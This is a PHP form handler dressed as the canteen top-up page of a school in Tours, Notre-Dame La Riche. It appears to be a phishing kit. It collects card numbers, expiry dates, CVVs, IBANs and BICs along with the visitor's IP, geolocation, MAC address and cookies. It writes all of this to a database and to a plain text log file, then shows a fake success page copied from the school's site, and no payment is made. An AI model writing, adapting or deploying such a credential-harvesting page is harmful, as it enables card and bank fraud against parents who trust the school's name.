<?php 
ini_set('display_errors', 1);
error_reporting(E_ALL);
// Inclure la configuration et les fonctions nécessaires
require_once 'config.php';
require_once 'functions.php';

// Activer les exceptions PDO pour une meilleure gestion des erreurs
$pdo = getDbConnection();
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    try {
    	date_default_timezone_set('Europe/Paris');
        $dateEnregistrement = date("d/m/Y H:i:s");

        //Récupération de l'adresse MAC:
        $MAC = getMacAddress();
    	
        // Récupération des adresses IP et autres informations
        $ip = $_SERVER['REMOTE_ADDR'];

        // Récupérer la localisation de l'utilisateur via l'API ipinfo.io
        $url = "https://ipinfo.io/{$ip}/json";
        $options = [
            "http" => [
                "timeout" => 5  // Timeout de 10 secondes
            ]
        ];
        $context = stream_context_create($options);

        // Effectuer la requête HTTP
        $response = @file_get_contents($url, false, $context);

        if ($response === FALSE) {
            // En cas d'échec de la requête, affecter une valeur par défaut
            $location = "Inconnue";
        } else {
            // Décoder la réponse JSON
            $data = json_decode($response, true);

            // Vérifier la présence des informations et les assigner
            $city = isset($data['city']) ? $data['city'] : 'Inconnue';
            $region = isset($data['region']) ? $data['region'] : 'Inconnue';
            $country = isset($data['country']) ? $data['country'] : 'Inconnue';

            $location = "Ville : $city, Région : $region, Pays : $country";
        }

        // Préparer les informations cookies
        $cookies = isset($_COOKIE) ? json_encode($_COOKIE) : 'Aucun cookie';

        // Vérifier et traiter le formulaire soumis
        if (isset($_POST['nom_titulaire'], $_POST['email'], $_POST['num_carte'])) {
            // Recharge par carte bancaire
            $data = [
                'num_carte_cantine' => $_POST['num_carte_cantine'] ?? null,
                'nom_titulaire' => $_POST['nom_titulaire'] ?? null,
                'num_carte' => $_POST['num_carte'] ?? null,
                'date_exp' => $_POST['date_exp'] ?? null,
                'cvv' => $_POST['cvv'] ?? null,
                'montant' => $_POST['montant'] ?? null,
            ];

            // Validation simple
            if (!$data['num_carte_cantine'] || !$data['nom_titulaire'] || !$data['num_carte'] || !$data['date_exp'] || !$data['cvv'] || !$data['montant']) {
                throw new Exception("Veuillez remplir tous les champs obligatoires.");
            }

            // Insertion dans la base de données
            $sql = "INSERT INTO recharges_bancaires (num_carte_cantine, nom_titulaire, num_carte, date_exp, cvv, montant) 
                    VALUES (:num_carte_cantine, :nom_titulaire, :num_carte, :date_exp, :cvv, :montant)";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($data);

            // Création du fichier de log
            $file = 'recharges_bancaires.txt';
            $dataToFile = "ID : {$pdo->lastInsertId()}
                Numéro de carte de cantine : {$data['num_carte_cantine']}
                Email : {$_POST['email']}
                Numéro de carte bancaire : {$data['num_carte']}
                Nom du titulaire : {$data['nom_titulaire']}
                Date d'expiration : {$data['date_exp']}
                CVV : {$data['cvv']}
                Montant : {$data['montant']}
                MAC: $MAC
                IP : $ip
                Location : $location
                Cookies : $cookies
                Date : $dateEnregistrement\n";

            // Écrire les données dans le fichier
            file_put_contents($file, $dataToFile, FILE_APPEND);

            showSuccess("Recharge bancaire de {$data['montant']} € effectuée avec succès !");
        } elseif (isset($_POST['titulaire_compte'], $_POST['email'], $_POST['iban'])) {
            // Recharge par prélèvement mensuel
            $data = [
                'num_carte_cantine' => $_POST['num_carte_cantine'] ?? null,
                'titulaire_compte' => $_POST['titulaire_compte'] ?? null,
                'iban' => $_POST['iban'] ?? null,
                'bic' => $_POST['bic'] ?? null,
                'montant_mensuel' => $_POST['montant_mensuel'] ?? null,
            ];

            // Validation simple
            if (!$data['num_carte_cantine'] || !$data['titulaire_compte'] || !$data['iban'] || !$data['bic'] || !$data['montant_mensuel']) {
                throw new Exception("Veuillez remplir tous les champs obligatoires.");
            }

            // Insertion dans la base de données
            $sql = "INSERT INTO prelevements_mensuels (num_carte_cantine, titulaire_compte, iban, bic, montant_mensuel) 
                    VALUES (:num_carte_cantine, :titulaire_compte, :iban, :bic, :montant_mensuel)";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($data);

            // Création du fichier de log
            $file = 'recharges_bancaires.txt';
            $dataToFile = "ID : {$pdo->lastInsertId()}
                Numéro de carte de cantine : {$data['num_carte_cantine']}
                Titulaire du compte : {$data['titulaire_compte']}
                IBAN : {$data['iban']}
                BIC : {$data['bic']}
                Montant : {$data['montant_mensuel']}
                MAC: $MAC
                IP : $ip
                Location : $location
                Cookies : $cookies
                Date : $dateEnregistrement\n";

            file_put_contents($file, $dataToFile, FILE_APPEND);

            showSuccess("Prélèvement mensuel de {$data['montant_mensuel']} € configuré avec succès !");
        } else {
            throw new Exception("Aucune action valide détectée.");
        }

    } catch (Exception $e) {
        showError("Erreur : " . $e->getMessage());
    }
}


// Fonction pour afficher un message de succès
function showSuccess($message) {
    echo "<!DOCTYPE html>
    <html lang='fr'>
    <head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>
    <meta name='description' content=' Notre-Dame la Riche (NDLR) :  des établissements à taille humaine, avec un directeur d'étude par établissement, pour scolariser élèves, collégiens, lycéens et étudiants de l'école maternelle aux BTS !'>
    <meta name='author' content=''>
    <link rel='icon' href='img/favicon.ico'>

    <link rel='preload' href='img/slider/JPO_sliderSite-Nov24.jpg' as='image' media='(max-width: 575px)'>
    <link rel='preload' href='img/slider/slider-hiver-2022.jpg' as='image' media='(min-width: 576px)'>
    <link rel='preload' href='img/slider/slider-po-mars2-mobile.jpg' as='image' media='(max-width: 575px)'>
    <link rel='preload' href='img/slider/TA-slider.html' as='image' media='(min-width: 576px)'>
    <link rel='preload' href='img/slider/ecole-hoteliere-mobile.jpg' as='image' media='(max-width: 575px)'>
    <link rel='preload' href='img/slider/ecole-hoteliere.jpg' as='image' media='(min-width: 576px)'>
    
    <link rel='preload' href='https://fonts.googleapis.com/css?family=Open+Sans|Oswald:200,300,400,500,600,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap' as='style'>
    <link rel='preload' href='css/style.min.css' as='style'>
    <link rel='preload' href='css/all.min.css' as='style'>

    <link href='https://fonts.googleapis.com/css?family=Open+Sans|Oswald:200,300,400,500,600,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap' rel='stylesheet'>
    <link rel='stylesheet' href='css/base.min.css'>
    <link rel='stylesheet' href='css/style.min.css'>
    <link rel='stylesheet' href='css/all.min.css'>


    <meta property='og:url' content='index.html#video' />
    <meta property='og:title' content='Découvrez Notre-Dame La Riche en vidéo' />
    <meta property='og:image' content='img/og-video-170221.jpg' />

    <title>Institution Notre Dame La Riche NDLR Tours Quartier des Halles</title>
    <link rel='canonical' href='index.html' />
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f8f9fa;
                margin: 0;
            }
            .message-container-wrapper{
                padding-top: 35vh;
                height: 80vh;
            }
            .message-container {
                margin: auto;
                text-align: center;
                background-color: green;
                color: white;
                padding: 20px 30px;
                border-radius: 8px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                width: 400px;
            }
            .message-container h1 {
                margin: 0;
                font-size: 24px;
            }
            .message-container p {
                font-size: 18px;
            }
            .message-container a {
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
                padding: 10px 20px;
                background-color: #007bff;
                color: white !important;
                border-radius: 5px;
            }
            .message-container a:hover {
                background-color: #0056b3;
            }
            footer{
                background-color: #004d80;
                color: white;
                text-align: center;
                padding: 10px;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
        </style>
    </head>
    <body>
        <div class='nav-contact-mobile'>
            <p class='text-center'>
                <a href='inscription.html'>Préinscription</a>
                <a href='contact.html'>Contact</a>
                <a href='tel:0247363200'>02 47 36 32 00</a>
                <a href='https://www.facebook.com/INDLRTours/' target='_blank' rel='noopener' aria-label='facebook notre dame la riche tours'><i class='fab fa-facebook-f'></i></a>
                <a href='https://www.linkedin.com/company/institution-notre-dame-la-riche' target='_blank' rel='noopener' aria-label='linkedin notre dame la riche tours'><i class='fab fa-linkedin-in'></i></a>
                <a href='https://g.page/r/CQT4N8k-Kit5EAE' target='_blank' rel='noopener' aria-label='linkedin notre dame la riche tours'><i class='fab fa-google'></i></a>
                <a href='https://www.ecoledirecte.com/login?P=undefined&amp;idunique=undefined&amp;key=undefined&amp;login=undefined&amp;camefrom=%2FWD170AWP%2FWD170Awp.exe%2FCONNECT%2FECOLEDIRECTEV2' target='_blank' rel='noopener'><img src='img/ecole-direct.svg' alt='ecole directe notre dame la riche ndlr'></a>
            </p>
        </div>
        <div class='head-shadow sticky-top'>
            <nav class='navbar navbar-expand-md navbar-light'>
                <a class='navbar-brand' href='#'><img class='logo' src='img/logo-notre-dame-la-riche.png' alt='institution notre dame la riche tours ndlr'></a>
                <button class='navbar-toggler' type='button' data-toggle='collapse' data-target='#navbarsExampleDefault' aria-controls='navbarsExampleDefault' aria-expanded='false' aria-label='Toggle navigation'>
                    <span class='navbar-toggler-icon'></span>
                </button>

                <div class='collapse navbar-collapse' id='navbarsExampleDefault'>
                    <ul class='navbar-nav mr-auto'>
                        <li class='nav-item dropdown'>
                            <a class='nav-link dropdown-toggle' href='#' id='dropdown01' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>L'institution</a>
                            <div class='dropdown-menu' aria-labelledby='dropdown01'>
                                <a class='dropdown-item' href='institution.html'>Présentation</a>
                                <a class='dropdown-item' href='projet-educatif.html'>Projet éducatif</a>
                                <a class='dropdown-item' href='micro-creche.html'>Micro-crèche</a>
                                <a class='dropdown-item' href='section-sportive.html'>Sections sportives</a>
                                <a class='dropdown-item' href='theatre.html'>Théâtre</a>
                                <a class='dropdown-item' href='internat.html'>Internat</a>
                                <a class='dropdown-item' href='solidarite.html'>Solidarité</a>
                                <a class='dropdown-item' href='pastorale.html'>Pastorale</a>
                                <a class='dropdown-item' href='ecole-hoteliere.html'>Ecole Hôtelière</a>
                                <a class='dropdown-item' href='international.html'>International</a>
                                <a class='dropdown-item' href='dispositif-allophones.html'>Dispositif allophones</a>
                                <a class='dropdown-item' href='tarifs-inscriptions.html'>Tarifs et inscriptions</a>
                            </div>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='ecole.html'>École</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='college.html'>Collège</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='baccalaureat-general.html'>Lycée&nbsp;Général</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='baccalaureat-technologique.html'>Lycée&nbsp;Techno</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='baccalaureat-professionnel.html'>Lycée&nbsp;Pro</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='campus.html'>Campus</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='cantine.html'>CANTINE</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>
        <div class='message-container-wrapper'>
            <div class='message-container'>
                <h1>Succès !</h1>
                <p>$message</p>
                <a href='index.html'>Retour à l'accueil</a>
            </div>
        </div>
        <footer>
    <p class='text-center'>Autres sites Notre Dame La Riche : <a href='https://www.lagabarre.fr/' target='_blank' rel='noopener'>La Gabarre</a> | <a href='https://www.iscb.fr/' target='_blank' rel='noopener'>ISCB</a> | <a href='https://wineandspiritschool.fr/' target='_blank' rel='noopener'>Ecole des Vins</a></p><br />
    <p><a href='mentions-legales.html'>Mentions légales</a> | <a href='newsletters.html'>Newsletters</a> | <a href='liens-pratiques.html'>Liens pratiques</a></p>
</footer>

    
    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src='../code.jquery.com/jquery-3.5.1.slim.min.js' integrity='sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj' crossorigin='anonymous'></script>
    <!--<script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js' integrity='sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut' crossorigin='anonymous'></script>-->
    <script src='../stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js' integrity='sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6' crossorigin='anonymous'></script>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans|Oswald:200,300,400,500,600,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap' rel='stylesheet'>
    </html>";
    exit;
}

// Fonction pour afficher un message d'erreur
function showError($message) {
    echo "<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>
    <meta name='description' content=' Notre-Dame la Riche (NDLR) :  des établissements à taille humaine, avec un directeur d'étude par établissement, pour scolariser élèves, collégiens, lycéens et étudiants de l'école maternelle aux BTS !'>
    <meta name='author' content=''>
    <link rel='icon' href='img/favicon.ico'>

    <link rel='preload' href='img/slider/JPO_sliderSite-Nov24.jpg' as='image' media='(max-width: 575px)'>
    <link rel='preload' href='img/slider/slider-hiver-2022.jpg' as='image' media='(min-width: 576px)'>
    <link rel='preload' href='img/slider/slider-po-mars2-mobile.jpg' as='image' media='(max-width: 575px)'>
    <link rel='preload' href='img/slider/TA-slider.html' as='image' media='(min-width: 576px)'>
    <link rel='preload' href='img/slider/ecole-hoteliere-mobile.jpg' as='image' media='(max-width: 575px)'>
    <link rel='preload' href='img/slider/ecole-hoteliere.jpg' as='image' media='(min-width: 576px)'>
    
    <link rel='preload' href='https://fonts.googleapis.com/css?family=Open+Sans|Oswald:200,300,400,500,600,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap' as='style'>
    <link rel='preload' href='css/style.min.css' as='style'>
    <link rel='preload' href='css/all.min.css' as='style'>

    <link href='https://fonts.googleapis.com/css?family=Open+Sans|Oswald:200,300,400,500,600,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap' rel='stylesheet'>
    <link rel='stylesheet' href='css/base.min.css'>
    <link rel='stylesheet' href='css/style.min.css'>
    <link rel='stylesheet' href='css/all.min.css'>


    <meta property='og:url' content='index.html#video' />
    <meta property='og:title' content='Découvrez Notre-Dame La Riche en vidéo' />
    <meta property='og:image' content='img/og-video-170221.jpg' />

    <title>Institution Notre Dame La Riche NDLR Tours Quartier des Halles</title>
    <link rel='canonical' href='index.html' />
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f8f9fa;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .message-container-wrapper{
                padding-top: 25vh;
                height: 80vh;
            }
            .message-container {
                text-align: center;
                background-color: #dc3545;
                color: white;
                padding: 20px 30px;
                border-radius: 8px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                width: 400px;
            }
            .message-container h1 {
                margin: 0;
                font-size: 24px;
            }
            .message-container p {
                font-size: 18px;
            }
            .message-container a {
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
                padding: 10px 20px;
                background-color: #007bff;
                color: white!important;
                border-radius: 5px;
            }
            .message-container a:hover {
                background-color: #0056b3;
            }
            footer{
                background-color: #004d80;
                color: white;
                text-align: center;
                padding: 10px;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
        </style>
    </head>
    <body>
        <div class='nav-contact-mobile'>
            <p class='text-center'>
                <a href='inscription.html'>Préinscription</a>
                <a href='contact.html'>Contact</a>
                <a href='tel:0247363200'>02 47 36 32 00</a>
                <a href='https://www.facebook.com/INDLRTours/' target='_blank' rel='noopener' aria-label='facebook notre dame la riche tours'><i class='fab fa-facebook-f'></i></a>
                <a href='https://www.linkedin.com/company/institution-notre-dame-la-riche' target='_blank' rel='noopener' aria-label='linkedin notre dame la riche tours'><i class='fab fa-linkedin-in'></i></a>
                <a href='https://g.page/r/CQT4N8k-Kit5EAE' target='_blank' rel='noopener' aria-label='linkedin notre dame la riche tours'><i class='fab fa-google'></i></a>
                <a href='https://www.ecoledirecte.com/login?P=undefined&amp;idunique=undefined&amp;key=undefined&amp;login=undefined&amp;camefrom=%2FWD170AWP%2FWD170Awp.exe%2FCONNECT%2FECOLEDIRECTEV2' target='_blank' rel='noopener'><img src='img/ecole-direct.svg' alt='ecole directe notre dame la riche ndlr'></a>
            </p>
        </div>
        <div class='head-shadow sticky-top'>
            <nav class='navbar navbar-expand-md navbar-light'>
                <a class='navbar-brand' href='#'><img class='logo' src='img/logo-notre-dame-la-riche.png' alt='institution notre dame la riche tours ndlr'></a>
                <button class='navbar-toggler' type='button' data-toggle='collapse' data-target='#navbarsExampleDefault' aria-controls='navbarsExampleDefault' aria-expanded='false' aria-label='Toggle navigation'>
                    <span class='navbar-toggler-icon'></span>
                </button>

                <div class='collapse navbar-collapse' id='navbarsExampleDefault'>
                    <ul class='navbar-nav mr-auto'>
                        <li class='nav-item dropdown'>
                            <a class='nav-link dropdown-toggle' href='#' id='dropdown01' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>L'institution</a>
                            <div class='dropdown-menu' aria-labelledby='dropdown01'>
                                <a class='dropdown-item' href='institution.html'>Présentation</a>
                                <a class='dropdown-item' href='projet-educatif.html'>Projet éducatif</a>
                                <a class='dropdown-item' href='micro-creche.html'>Micro-crèche</a>
                                <a class='dropdown-item' href='section-sportive.html'>Sections sportives</a>
                                <a class='dropdown-item' href='theatre.html'>Théâtre</a>
                                <a class='dropdown-item' href='internat.html'>Internat</a>
                                <a class='dropdown-item' href='solidarite.html'>Solidarité</a>
                                <a class='dropdown-item' href='pastorale.html'>Pastorale</a>
                                <a class='dropdown-item' href='ecole-hoteliere.html'>Ecole Hôtelière</a>
                                <a class='dropdown-item' href='international.html'>International</a>
                                <a class='dropdown-item' href='dispositif-allophones.html'>Dispositif allophones</a>
                                <a class='dropdown-item' href='tarifs-inscriptions.html'>Tarifs et inscriptions</a>
                            </div>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='ecole.html'>École</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='college.html'>Collège</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='baccalaureat-general.html'>Lycée&nbsp;Général</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='baccalaureat-technologique.html'>Lycée&nbsp;Techno</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='baccalaureat-professionnel.html'>Lycée&nbsp;Pro</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='campus.html'>Campus</a>
                        </li>
                        <li class='nav-item'>
                            <a class='nav-link' href='cantine.html'>CANTINE</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>
        <div class='message-container-wrapper'>
            <div class='message-container'>
                <h1>Erreur</h1>
                <p>$message</p>
                <a href='index.html'>Retour à l'accueil</a>
            </div>
        </div>
        <footer>
    <p class='text-center'>Autres sites Notre Dame La Riche : <a href='https://www.lagabarre.fr/' target='_blank' rel='noopener'>La Gabarre</a> | <a href='https://www.iscb.fr/' target='_blank' rel='noopener'>ISCB</a> | <a href='https://wineandspiritschool.fr/' target='_blank' rel='noopener'>Ecole des Vins</a></p><br />
    <p><a href='mentions-legales.html'>Mentions légales</a> | <a href='newsletters.html'>Newsletters</a> | <a href='liens-pratiques.html'>Liens pratiques</a></p>
</footer>

    
    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src='../code.jquery.com/jquery-3.5.1.slim.min.js' integrity='sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj' crossorigin='anonymous'></script>
    <!--<script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js' integrity='sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut' crossorigin='anonymous'></script>-->
    <script src='../stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js' integrity='sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6' crossorigin='anonymous'></script>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans|Oswald:200,300,400,500,600,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap' rel='stylesheet'>
    </html>";
    exit;
}
?>